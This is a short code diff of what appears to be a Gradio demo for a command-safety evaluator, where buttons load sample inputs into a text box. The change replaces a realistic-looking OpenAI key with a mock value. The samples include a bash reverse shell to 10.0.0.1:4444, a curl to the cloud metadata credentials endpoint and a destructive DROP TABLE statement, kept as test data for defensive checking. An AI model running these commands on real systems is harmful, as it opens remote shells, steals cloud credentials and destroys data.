@@ -162,7 +162,7 @@ with gr.Blocks(theme=gr.themes.Soft(primary_hue="blue", neutral_hue="slate"), cs
             btn_sql.click(lambda: "DROP TABLE users CASCADE; -- blind injection wipe", outputs=input_text)
             btn_ssrf.click(lambda: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/", outputs=input_text)
             btn_rev.click(lambda: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", outputs=input_text)
-            btn_sec.click(lambda: "export OPENAI_API_KEY='sk-proj-98af87sd98fa7sd89fa7sd98fa7sd98fa7sd8f9a7'", outputs=input_text)
+            btn_sec.click(lambda: "export OPENAI_API_KEY='sk-DEMO-SAMPLE-MOCK-CREDENTIAL-KEY-DO-NOT-USE'", outputs=input_text)
             btn_safe.click(lambda: "SELECT id, product_name, price FROM inventory WHERE in_stock = 1 LIMIT 50;", outputs=input_text)
 
             eval_btn.click(
